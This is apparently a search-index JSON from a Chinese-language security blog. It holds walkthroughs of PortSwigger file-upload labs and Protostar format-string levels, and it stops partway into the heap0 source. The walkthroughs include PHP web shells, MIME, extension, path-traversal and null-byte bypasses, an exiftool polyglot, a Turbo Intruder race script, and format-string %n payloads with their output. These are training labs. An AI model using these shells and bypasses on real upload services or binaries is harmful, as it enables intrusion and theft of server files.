{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"Dark &amp; Lord \u671d\u6e38\u4e1c\u6d77 \u66ae\u4f11\u5bd2\u5c71 \u5fa1\u516d\u6c14\u53d8 \u4e58\u5929\u5730\u95f4      Github"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/","title":"File upload vulnerabilities","text":""},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#remote-code-execution-via-web-shell-upload","title":"Remote code execution via web shell upload","text":"<pre><code>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file\u00a0`/home/carlos/secret`. Submit this secret using the button provided in the lab banner.\n\nYou can log in to your own account using the following credentials:\u00a0`wiener:peter`\n</code></pre> <p>\u4f7f\u7528\u7ed9\u5b9a\u7684\u8d26\u6237\u5bc6\u7801\u767b\u9646\uff0c\u70b9\u51fb\u4e0a\u4f20\u5934\u50cf\u7684\u6309\u94ae\uff0c\u4e0a\u4f20php\u6587\u4ef6\uff1a <pre><code>1. `&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;`\n</code></pre></p> <p></p> <p>\u8fd4\u56de\u5e76\u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6\u94fe\u63a5\uff1a </p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#web-shell-upload-via-content-type-restriction-bypass","title":"Web shell upload via Content-Type restriction bypass","text":"<p>\u4f7f\u7528\u8d26\u6237\u5bc6\u7801\u7684\u767b\u9646\u5e76\u4e0a\u4f20php shell\uff1a<code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code>\uff0c\u663e\u793a\uff1a <pre><code>Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.\n</code></pre></p> <p>\u518d\u6b21\u4e0a\u4f20\uff0c\u6293\u5305\u5e76\u4fee\u6539MIME </p> <pre><code>The file avatars/mm3.php has been uploaded.\n</code></pre> <p>\u8bbf\u95ee\u4e0a\u4f20\u6210\u529f\u7684php\u6587\u4ef6\u5f97\u5230\uff1a </p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#web-shell-upload-via-path-traversal","title":"Web shell upload via path traversal","text":"<p>\u4e0a\u4f20\u6587\u4ef6\uff0c\u4fee\u6539\u6587\u4ef6\u540d\u4e3a<code>..%2fmm3.php</code> </p> <p>\u5219\u4e0a\u4f20\u6587\u4ef6\u8bbf\u95ee\u8def\u5f84\u4ece<code>/files/avatars/..%2fmm3.php</code>\u53d8\u4e3a<code>/files/mm3.php</code> </p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#web-shell-upload-via-extension-blacklist-bypass","title":"Web shell upload via extension blacklist bypass","text":"<p>\u4e0a\u4f20php\u6587\u4ef6\u63d0\u793a\u65e0\u6cd5\u4e0a\u4f20 <pre><code>Sorry, php files are not allowed Sorry, there was an error uploading your file.\n</code></pre></p> <p>\u91cd\u65b0\u4e0a\u4f20\u3001\u6293\u5305\u4fee\u6539\u540e\u7f00\u4e3aphp5\uff0c\u53ef\u4ee5\u4e0a\u4f20\uff0c\u4f46\u662f\u8bbf\u95ee\u9875\u9762\u7a7a\u767d\uff0c\u8bf4\u660e\u6ca1\u6709\u89e3\u6790 \u5c1d\u8bd5\u4e0a\u4f20<code>.htaccess</code>\u6587\u4ef6\uff0c\u5e76\u8bbe\u7f6e<code>AddType application/x-httpd-php .abc</code>,\u5373\u4f1a\u5c06<code>.abc</code>\u7684\u540e\u7f00\u6587\u4ef6\u89e3\u6790\u4e3aphp\u6587\u4ef6\uff1a </p> <p>\u518d\u6b21\u4e0a\u4f20<code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code>\u7684shell\u5e76\u4fee\u6539\u540e\u7f00\u4e3aabc: </p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#web-shell-upload-via-obfuscated-file-extension","title":"Web shell upload via obfuscated file extension","text":"<p>\u4e0a\u4f20php \u6587\u4ef6\u63d0\u793a\u5982\u4e0b\uff1a <pre><code>Sorry, only JPG &amp; PNG files are allowed Sorry, there was an error uploading your file.\n</code></pre></p> <p>\u5c06\u540e\u7f00\u4fee\u6539\u4e3a<code>mm3.php.png</code>\uff0c\u6210\u529f\u4e0a\u4f20\uff0c\u4f46\u662f\u65e0\u6cd5\u6267\u884c\u547d\u4ee4 </p> <p>\u90a3\u4e48\uff0c\u518d\u6b21\u4e0a\u4f20\u5e76\u4f7f\u7528<code>%00</code>\u8fdb\u884c\u622a\u65ad\uff1a </p> <p></p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#remote-code-execution-via-polyglot-web-shell-upload","title":"Remote code execution via polyglot web shell upload","text":"<p>\u4e0a\u4f20php\u6587\u4ef6\uff0c\u63d0\u793a\u9519\u8bef\uff1a <pre><code>Error: file is not a valid image Sorry, there was an error uploading your file.\n</code></pre></p> <p>\u6839\u636e\u672c\u9898\u76ee\u7684\u63d0\u793a\uff0c\u6211\u4eec\u6267\u884c\u4e0b\u9762\u547d\u4ee4\uff1a <pre><code>`exiftool -Comment=\"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;\" ./beef.png -o polyglot.php`\n</code></pre></p> <p>\u7136\u540e\u4e0a\u4f20polyglot.php\u5e76\u8bbf\u95ee: </p>"},{"location":"PortSwigger-Academy/File%20upload%20vulnerabilities/#web-shell-upload-via-race-condition","title":"Web shell upload via race condition","text":"<p>\u76f4\u63a5\u767b\u9646\u5e76\u4e0a\u4f20php\u6587\u4ef6\uff0c\u63d0\u793a\uff1a <pre><code>Sorry, only JPG &amp; PNG files are allowed Sorry, there was an error uploading your file.\n</code></pre></p> <p>\u67e5\u770b\u9898\u76ee\u6e90\u7801\uff1a <pre><code>&lt;?php $target_dir = \"avatars/\"; $target_file = $target_dir . $_FILES[\"avatar\"][\"name\"]; // temporary move \nmove_uploaded_file($_FILES[\"avatar\"][\"tmp_name\"], $target_file); \nif (checkViruses($target_file) &amp;&amp; checkFileType($target_file)) {\necho \"The file \". htmlspecialchars( $target_file). \" has been uploaded.\"; } \nelse { \nunlink($target_file); echo \"Sorry, there was an error uploading your file.\"; http_response_code(403); \n} \nfunction checkViruses($fileName) { \n// checking for viruses ... \n} \nfunction checkFileType($fileName) {\n$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION)); if($imageFileType != \"jpg\" &amp;&amp; $imageFileType != \"png\") { echo \"Sorry, only JPG &amp; PNG files are allowed\\n\"; return false; \n} \nelse \n{ return true; } \n} ?&gt;\n</code></pre></p> <p>\u6587\u4ef6\u5728\u88ab\u5220\u9664\u4e4b\u524d\u65f6\u95f4\u6781\u77ed\uff0c\u624b\u52a8\u8bbf\u95ee\u80af\u5b9a\u662f\u6765\u4e0d\u53ca\u7684 \u5b89\u88c5Turbo Intruder\u63d2\u4ef6\uff0c\u7136\u540e\u4e0a\u4f20shell\u811a\u672c\u5e76\u62e6\u622a\uff0c\u8f6c\u53d1\u5230Turbo Intruder,\u5e76\u4e3aTurbo Intruder\u7f16\u5199python\u811a\u672c\u4ee3\u7801: </p> <pre><code>def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20,)\n\n    request1 = '''POST /my-account/avatar HTTP/2\nHost: 0ac5001e043d488093ac75f400d90071.web-security-academy.net\nCookie: session=6ceEgnzGZDPJhdUxnMhJ9owlAhxv4ffH\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=---------------------------23366847436050054392067369933\nContent-Length: 540\nOrigin: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net\nDnt: 1\nSec-Gpc: 1\nReferer: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net/my-account\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\n-----------------------------23366847436050054392067369933\nContent-Disposition: form-data; name=\"avatar\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;\n\n-----------------------------23366847436050054392067369933\nContent-Disposition: form-data; name=\"user\"\n\nwiener\n-----------------------------23366847436050054392067369933\nContent-Disposition: form-data; name=\"csrf\"\n\nccPKgZVp4rUg28kBKQVVVFv0eDbXBkf3\n-----------------------------23366847436050054392067369933--\n'''\n\n    request2 = '''GET /files/avatars/shell.php HTTP/2\nHost: 0ac5001e043d488093ac75f400d90071.web-security-academy.net\nCookie: session=6ceEgnzGZDPJhdUxnMhJ9owlAhxv4ffH\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nDnt: 1\nSec-Gpc: 1\nReferer: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net/my-account\nSec-Fetch-Dest: image\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nIf-Modified-Since: Thu, 17 Jul 2025 03:02:55 GMT\nIf-None-Match: \"39-63a173effa107\"\nPriority: u=5, i\nTe: trailers\n\n\n    '''\n\n    # the 'gate' argument blocks the final byte of each request until openGate is invoked\n    engine.queue(request1, gate='race1')\n    for x in range(5):\n        engine.queue(request2, gate='race1')\n\n    # wait until every 'race1' tagged request is ready\n    # then send the final byte of each request\n    # (this method is non-blocking, just like queue)\n    engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n</code></pre> <p>\u5b9e\u9645\u529f\u80fd\u5c31\u662f\u4e0a\u4f20shell,\u7136\u540e\u5728\u88ab\u68c0\u67e5\u5220\u9664\u4e4b\u524d\u62fc\u624b\u901f\u53bb\u8bf7\u6c42\u6682\u65f6\u6ca1\u6709\u88ab\u5220\u9664\u7684shell\uff1a </p>"},{"location":"pwn/Protostar_format0/","title":"Protostar format0","text":"<pre><code># Format Zero\n\nThis level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.\n\n**Hints**\n\n- This level should be done in less than 10 bytes of input.\n- \u201cExploiting format string vulnerabilities\u201d\n\nThis level is at /opt/protostar/bin/format0\n</code></pre> <p>Source code <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vuln(char *string)\n{\n  volatile int target;\n  char buffer[64];\n\n  target = 0;\n\n  sprintf(buffer, string);\n\n  if(target == 0xdeadbeef) {\n      printf(\"you have hit the target correctly :)\\n\");\n  }\n}\n\nint main(int argc, char **argv)\n{\n  vuln(argv[1]);\n}\n</code></pre></p> <p>checksec</p> <pre><code>\u2514\u2500$ checksec --file=format0 \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1               format0\n</code></pre> <pre><code>\u2514\u2500$ objdump -t -j .text format0 \n\nformat0:     file format elf32-i386\n\nSYMBOL TABLE:\n08048340 l    d  .text  00000000              .text\n08048370 l     F .text  00000000              __do_global_dtors_aux\n080483d0 l     F .text  00000000              frame_dummy\n080484c0 l     F .text  00000000              __do_global_ctors_aux\n08048450 g     F .text  00000005              __libc_csu_fini\n08048340 g     F .text  00000000              _start\n08048460 g     F .text  0000005a              __libc_csu_init\n080483f4 g     F .text  00000037              vuln\n080484ba g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n0804842b g     F .text  0000001b              main\n</code></pre> <p>\u672c\u9898\u662f\u628a\u63a5\u53d7\u7684\u53c2\u6570\u6253\u5370\u5230\u4e86buffer\u4e2d</p> <p>python2 <pre><code>\u2514\u2500$ ./format0 `python2 -c 'print(\"%64s\\xef\\xbe\\xad\\xde\")'`\nyou have hit the target correctly :)\n</code></pre></p> <p>python3 ** \u4e2d<code>print()</code> \u51fd\u6570\u9ed8\u8ba4\u4f1a\u5728\u8f93\u51fa\u672b\u5c3e\u81ea\u52a8\u6dfb\u52a0\u4e00\u4e2a\u6362\u884c\u7b26 <code>\\n</code> (0x0A) <code>sys.stdout.buffer.write()</code> \u76f4\u63a5\u5199\u5165\u5b57\u8282\u6d41\uff0c\u4e0d\u6dfb\u52a0\u4efb\u4f55\u989d\u5916\u5b57\u7b26** <pre><code>\u2514\u2500$ ./format0 `python3 -c \"import sys; sys.stdout.buffer.write(b'%64d\\xef\\xbe\\xad\\xde')\"`\nyou have hit the target correctly :)\n</code></pre></p> <p>echo <code>-n</code> \u8868\u793a\u4e0d\u6362\u884c\uff0c<code>-e</code> \u8868\u793a\u89e3\u91ca\u8f6c\u4e49\u5b57\u7b26\uff08\u5982 <code>\\xef</code>\uff09 <pre><code>\u2514\u2500$ ./format0 $(echo -ne '%64d\\xef\\xbe\\xad\\xde')\nyou have hit the target correctly :)\n</code></pre></p>"},{"location":"pwn/Protostar_format1/","title":"Protostar format1","text":"<pre><code># Format One\n\nThis level shows how format strings can be used to modify arbitrary memory locations.\n\n**Hints**\n\n- objdump -t is your friend, and your input string lies far up the stack :)\n\nThis level is at /opt/protostar/bin/format1\n</code></pre>"},{"location":"pwn/Protostar_format1/#include-stdlibh-include-unistdh-include-stdioh-include-stringh-int-target-void-vulnchar-string-printfstring-iftarget-printfyou-have-modified-the-target-n-int-mainint-argc-char-argv-vulnargv1","title":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint target;\n\nvoid vuln(char *string)\n{\n  printf(string);\n\n  if(target) {\n      printf(\"you have modified the target :)\\n\");\n  }\n}\n\nint main(int argc, char **argv)\n{\n  vuln(argv[1]);\n}\n</code></pre>","text":"<p>\u68c0\u67e5 <code>target</code> \u662f\u5426\u975e\u96f6\uff0c\u5982\u679c\u88ab\u4fee\u6539\u5219\u6253\u5370\u6210\u529f\u6d88\u606f \u7531\u4e8eprintf(string)\u76f4\u63a5\u6253\u5370\u4f20\u5165\u7684\u53c2\u6570\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6bd4\u5982<code>%s</code>\u7b49\uff0c\u53ef\u4ee5\u8f93\u5165\u5e26\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u8fdb\u884c\u5229\u7528</p>"},{"location":"pwn/Protostar_format1/#pwndbg-disass-main-dump-of-assembler-code-for-function-main-0x0804841c-0-push-ebp-0x0804841d-1-mov-ebpesp-0x0804841f-3-and-esp0xfffffff0-0x08048422-6-sub-esp0x10-0x08048425-9-mov-eaxdword-ptr-ebp0xc-0x08048428-12-add-eax0x4-0x0804842b-15-mov-eaxdword-ptr-eax-0x0804842d-17-mov-dword-ptr-espeax-0x08048430-20-call-0x80483f4-vuln-0x08048435-25-leave-0x08048436-26-ret-end-of-assembler-dump-pwndbg-disass-vuln-dump-of-assembler-code-for-function-vuln-0x080483f4-0-push-ebp-0x080483f5-1-mov-ebpesp-0x080483f7-3-sub-esp0x18-0x080483fa-6-mov-eaxdword-ptr-ebp0x8-0x080483fd-9-mov-dword-ptr-espeax-0x08048400-12-call-0x8048320-printfplt-0x08048405-17-mov-eaxds0x8049638-0x0804840a-22-test-eaxeax-0x0804840c-24-je-0x804841a-vuln38-0x0804840e-26-mov-dword-ptr-esp0x8048500-0x08048415-33-call-0x8048330-putsplt-0x0804841a-38-leave-0x0804841b-39-ret-end-of-assembler-dump","title":"<pre><code>pwndbg&gt; disass main\nDump of assembler code for function main:\n   0x0804841c &lt;+0&gt;:     push   ebp\n   0x0804841d &lt;+1&gt;:     mov    ebp,esp\n   0x0804841f &lt;+3&gt;:     and    esp,0xfffffff0\n   0x08048422 &lt;+6&gt;:     sub    esp,0x10\n   0x08048425 &lt;+9&gt;:     mov    eax,DWORD PTR [ebp+0xc]\n   0x08048428 &lt;+12&gt;:    add    eax,0x4\n   0x0804842b &lt;+15&gt;:    mov    eax,DWORD PTR [eax]\n   0x0804842d &lt;+17&gt;:    mov    DWORD PTR [esp],eax\n   0x08048430 &lt;+20&gt;:    call   0x80483f4 &lt;vuln&gt;\n   0x08048435 &lt;+25&gt;:    leave\n   0x08048436 &lt;+26&gt;:    ret\nEnd of assembler dump.\npwndbg&gt; disass vuln\nDump of assembler code for function vuln:\n   0x080483f4 &lt;+0&gt;:     push   ebp\n   0x080483f5 &lt;+1&gt;:     mov    ebp,esp\n   0x080483f7 &lt;+3&gt;:     sub    esp,0x18\n   0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR [ebp+0x8]\n   0x080483fd &lt;+9&gt;:     mov    DWORD PTR [esp],eax\n   0x08048400 &lt;+12&gt;:    call   0x8048320 &lt;printf@plt&gt;\n   0x08048405 &lt;+17&gt;:    mov    eax,ds:0x8049638\n   0x0804840a &lt;+22&gt;:    test   eax,eax\n   0x0804840c &lt;+24&gt;:    je     0x804841a &lt;vuln+38&gt;\n   0x0804840e &lt;+26&gt;:    mov    DWORD PTR [esp],0x8048500\n   0x08048415 &lt;+33&gt;:    call   0x8048330 &lt;puts@plt&gt;\n   0x0804841a &lt;+38&gt;:    leave\n   0x0804841b &lt;+39&gt;:    ret\nEnd of assembler dump.\n</code></pre>","text":"<p>\u5c1d\u8bd5\u786e\u5b9a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e</p> <pre><code>./format1 `python2 -c \"print 'AAAAAAAA' + '%08x.'*200 + '[%08x]'\"` |grep \".41414141.\"\n\n\u5f53\u7a0b\u5e8f\u00a0`format1`\u00a0\u8c03\u7528\u00a0`printf(argv[1])`\u00a0\u65f6\uff0c\u60a8\u7684\u8f93\u5165\u5b57\u7b26\u4e32\u88ab\u4f5c\u4e3a\u683c\u5f0f\u5b57\u7b26\u4e32\u4f20\u9012\u7ed9\u00a0`printf`\u3002`printf`\u00a0\u4f1a\u89e3\u6790\u683c\u5f0f\u5b57\u7b26\u4e32\uff1a\n- \u5bf9\u4e8e\u666e\u901a\u5b57\u7b26\uff08\u5982 \"AAAA\"\uff09\uff0c`printf`\u00a0\u4f1a\u76f4\u63a5\u8f93\u51fa\u5b83\u4eec\u3002\n- \u5bf9\u4e8e\u683c\u5f0f\u8bf4\u660e\u7b26\uff08\u5982\u00a0`%08x`\uff09\uff0c`printf`\u00a0\u4f1a\u4ece\u6808\u4e0a\u8bfb\u53d6\u76f8\u5e94\u7684\u53c2\u6570\u5e76\u5c06\u5176\u683c\u5f0f\u5316\u8f93\u51fa\n\n- \u8f93\u5165\u5b57\u7b26\u4e32\u4ee5\u00a0`'AAAAAAAA'`\u00a0\u5f00\u5934\uff0c\u8fd9\u4e0d\u662f\u683c\u5f0f\u8bf4\u660e\u7b26\uff0c\u6240\u4ee5\u00a0`printf`\u00a0\u76f4\u63a5\u8f93\u51fa\u8fd9\u4e9b\u5b57\u7b26\u3002\u8fd9\u5c31\u662f\u8f93\u51fa\u5f00\u5934\u51fa\u73b0\u7684 \"AAAAAAAA\"\u3002\n- \u7d27\u63a5\u7740\uff0c`printf`\u00a0\u9047\u5230\u7b2c\u4e00\u4e2a\u00a0`%08x`\uff0c\u5b83\u4ece\u6808\u4e0a\u8bfb\u53d6\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u901a\u5e38\u662f\u67d0\u4e2a\u968f\u673a\u503c\u6216\u5730\u5740\uff09\uff0c\u5e76\u8f93\u51fa\u4e3a 8 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08\u5982\u00a0`00000000`\uff09\uff0c\u7136\u540e\u8f93\u51fa\u4e00\u4e2a\u70b9\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u91cd\u590d 185 \u6b21\uff0c\u56e0\u6b64\u8f93\u51fa\u4e2d\u6709\u4e00\u957f\u4e32\u5341\u516d\u8fdb\u5236\u6570\u548c\u70b9\u3002\n\n- \u8f93\u5165\u5b57\u7b26\u4e32\u00a0`'AAAAAAAA'`\u00a0\u4e0d\u4ec5\u88ab\u76f4\u63a5\u8f93\u51fa\uff0c\u8fd8\u88ab\u5b58\u50a8\u5728\u6808\u4e0a\uff08\u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\u7684\u4e00\u90e8\u5206\uff09\u3002\u5f53\u00a0`printf`\u00a0\u5904\u7406\u683c\u5f0f\u8bf4\u660e\u7b26\u65f6\uff0c\u5b83\u4f1a\u9010\u6b65\u8bfb\u53d6\u6808\u4e0a\u7684\u503c\u3002\n</code></pre> <p> \u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u4f7f\u7528 1200 \u4e2a\u00a0<code>%08x\u3002</code>\u00a0\u548c\u4e00\u4e2a\u00a0<code>[%08x]</code>\uff0c\u603b\u5171 201 \u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\uff0c\u6211\u4eec\u6700\u7ec8\u8bfb\u53d6\u5230\u4e86\u6808\u4e0a\u5b58\u50a8\u8f93\u5165\u5b57\u7b26\u4e32\u00a0<code>'AAAAAAAA'</code>\u00a0\u7684\u4f4d\u7f6e\uff0c\u751a\u81f3\u8fd8\u591a\u8bfb\u53d6\u4e86\u4e00\u6bb5\u6570\u636e</p> <p>\u63a5\u4e0b\u6765\u51cf\u5c11\u957f\u5ea6\uff0c\u4f7f\u5f97\u521a\u597d\u8bfb\u53d6\u5230\u5b57\u7b26\u4e32\u00a0<code>'AAAAAAAA'</code>\u00a0\u7684\u4f4d\u7f6e </p> <p>\u627e\u5230target\u7684\u5730\u5740\uff0c\u5730\u5740\u4e3a0x08049638 <pre><code>\u2514\u2500$ objdump -t format1 |grep target\n08049638 g     O .bss   00000004              target\n</code></pre></p> <p>\u63a5\u4e0b\u6765\uff0c\u5c06\u8f93\u5165\u7684\u53c2\u6570\u66ff\u6362\u4e3aterget\u7684\u5730\u5740 </p> <p>\u63a5\u4e0b\u6765\uff0c\u5c06\u6570\u636e\u5199\u5165\u5730\u5740\uff0c\u6210\u529f\u8f93\u51fa\u5173\u952e\u53e5 </p> <pre><code>- `185$`\u00a0\u2192 \u8868\u793a\u201cprintf \u4ece\u7b2c 185 \u4e2a\u53c2\u6570\u62ff\u5730\u5740\u503c\u201d\u3002\u8fd9\u4e2a\u53c2\u6570\u5c31\u662f\u6211\u4eec\u5728\u524d\u9762\u585e\u8fdb\u53bb\u7684\u00a0`0x08049638`\u3002\n- `%n`\u00a0\u2192 \u628a\u5f53\u524d\u7d2f\u8ba1\u6253\u5370\u7684\u5b57\u7b26\u6570\uff08\u6bd4\u5982\u73b0\u5728\u53ef\u80fd\u662f 8\uff09\u5199\u5230\u8fd9\u4e2a\u5730\u5740\n- \u5f53 printf \u8dd1\u5230\u00a0`%185$n`\u00a0\u65f6\uff0c\u5b83\u628a\u00a0**\u6570\u5b57 8**\uff08\u5df2\u7ecf\u8f93\u51fa\u7684\u5b57\u7b26\u6570\u201cAAAA\u201d+ \u5730\u5740\u4e71\u7801\u4e4b\u7c7b\uff09\u5199\u8fdb\u00a0`0x08049638`\u3002\n- \u4e8e\u662f\u00a0`target`\u00a0=\u00a0`8`\n</code></pre>"},{"location":"pwn/Protostar_format2/","title":"Protostar format2","text":""},{"location":"pwn/Protostar_format2/#format-two-this-level-moves-on-from-format1-and-shows-how-specific-values-can-be-written-in-memory-this-level-is-at-optprotostarbinformat2","title":"<pre><code># Format Two\n\nThis level moves on from format1 and shows how specific values can be written in memory.\n\nThis level is at /opt/protostar/bin/format2\n</code></pre>","text":""},{"location":"pwn/Protostar_format2/#include-stdlibh-include-unistdh-include-stdioh-include-stringh-int-target-void-vuln-char-buffer512-fgetsbuffer-sizeofbuffer-stdin-fgetsbuffer-sizeofbuffer-stdin512-printfbuffer-iftarget-64-printfyou-have-modified-the-target-n-else-printftarget-is-d-n-target-int-mainint-argc-char-argv-vuln","title":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint target;\n\nvoid vuln()\n{\n  char buffer[512];\n\n  fgets(buffer, sizeof(buffer), stdin); //\u4f7f\u7528`fgets(buffer, sizeof(buffer), stdin)`\u4ece\u952e\u76d8\u6216\u91cd\u5b9a\u5411\u7684\u6587\u4ef6\u8bfb\u53d6\u8f93\u5165\uff0c\u6700\u591a\u8bfb\u53d6512\u5b57\u8282\n  printf(buffer);\n\n  if(target == 64) {\n      printf(\"you have modified the target :)\\n\");\n  } else {\n      printf(\"target is %d :(\\n\", target);\n  }\n}\n\nint main(int argc, char **argv)\n{\n  vuln();\n}\n</code></pre>","text":"<p>\u672c\u9898\u76ee\u76f8\u8f83\u4e8eformat1\u533a\u522b\u5982\u4e0b\uff1a <pre><code>1. **\u8f93\u5165\u65b9\u5f0f\u4e0d\u540c**\uff1a\u672c\u9898\u901a\u8fc7 `stdin` \u4f7f\u7528 `fgets` \u8bfb\u53d6\u8f93\u5165\uff08\u6700\u5927 512 \u5b57\u8282\uff09\uff0c\u800c\u524d\u4e00\u9898\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570 `argv[1]` \u63a5\u6536\u8f93\u5165\u3002\n2. **\u6210\u529f\u6761\u4ef6\u66f4\u4e25\u683c**\uff1a\u672c\u9898\u8981\u6c42\u5168\u5c40\u53d8\u91cf `target` \u5fc5\u987b\u88ab\u7cbe\u786e\u4fee\u6539\u4e3a **64** \u624d\u7b97\u6210\u529f\uff1b\u800c\u524d\u4e00\u9898\u53ea\u9700\u5c06\u5176\u4fee\u6539\u4e3a\u4efb\u610f\u975e\u96f6\u503c\u5373\u53ef\u3002\n</code></pre></p> <p>\u627e\u5230terget\u7684\u5730\u5740\uff1a 0x080496e4 <pre><code>\u2514\u2500$ objdump -t format2|grep target\n080496e4 g     O .bss   00000004              target\n</code></pre></p> <p>\u5c1d\u8bd5\u786e\u5b9a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e <pre><code>python2 -c \"print 'AAAA' + '%08x.'*10 + '[%08x]'\" | ./format2\n</code></pre> </p> <p>\u51cf\u5c11<code>%08x.</code>\u7684\u6570\u91cf\uff1a </p> <p>\u5c06\u5b57\u7b26\u4e32\u66ff\u6362\u4e3atarget\u7684\u5730\u5740 <pre><code>python2 -c \"print '\\xe4\\x96\\x04\\x08' + '%08x.'*3 + '[%08n]'\" | ./format2\n\ufffd00000200.f7f965c0.00000000.[]\ntarget is 32 :(\n</code></pre> </p> <p>\u6dfb\u52a0<code>%&lt;num&gt;c</code> \u7528\u4e8e\u586b\u5145\u957f\u5ea6\uff1a <pre><code>python2 -c \"print '\\xe4\\x96\\x04\\x08' + '%60c' + '%4\\$n'\" | ./format2\n\n# `%4$n` \u2192 \u628a\u201c\u5230\u76ee\u524d\u4e3a\u6b62\u8f93\u51fa\u7684\u5b57\u7b26\u6570\u201d\u5199\u5165\u6808\u4e0a\u7b2c 4 \u4e2a\u53c2\u6570\u6307\u5411\u7684\u5730\u5740\n#- \u7b2c 1 \u4e2a\u53c2\u6570\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\n#- \u7b2c 2\u30013\u30014 \u4e2a\u53c2\u6570\uff1a\u6808\u4e0a\u540e\u7eed\u5185\u5bb9\uff0c\u7b2c 4 \u4e2a\u6b63\u597d\u662f\u6211\u4eec\u653e\u7684\u5730\u5740\uff08\u9700\u8981\u8c03\u8bd5\u786e\u8ba4\u504f\u79fb\uff0c\u8fd9\u91cc\u5047\u8bbe\u662f 4\uff09\n</code></pre></p> <p></p>"},{"location":"pwn/Protostar_heap0/","title":"Protostar heap0","text":"<pre><code># Heap Zero\n\nThis level introduces heap overflows and how they can influence code flow.\n\nThis level is at /opt/protostar/bin/heap0\n</code></pre>"},{"location":"pwn/Protostar_heap0/#include-stdlibh-include-unistdh-include-stringh-include-stdioh-include-systypesh-struct-data-char-name64-struct-fp-int-fp-void-winner-printflevel-passedn-void-nowinner-printflevel-has-not-been-passedn-int-mainint-argc-char-argv-struct-data-d-struct-fp-f-d-mallocsizeofstruct-data-f-mallocsizeofstruct-fp-f-fp-nowinner-printfdata-is-at-p-fp-is-at-pn-d-f-strcpyd-name-argv1-f-fp","title":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n\nstruct data {\n  char name[64];\n};\n\nstruct fp {\n  int (*fp)();\n};\n\nvoid winner()\n{\n  printf(\"level passed\\n\");\n}\n\nvoid nowinner()\n{\n  printf(\"level has not been passed\\n\");\n}\n\nint main(int argc, char **argv)\n{\n  struct data *d;\n  struct fp *f;\n\n  d = malloc(sizeof(struct data));\n  f = malloc(sizeof(struct fp));\n  f-&gt;fp = nowinner;\n\n  printf(\"data is at %p, fp is at %p\\n\", d, f);\n\n  strcpy(d-&gt;name, argv[1]);\n\n  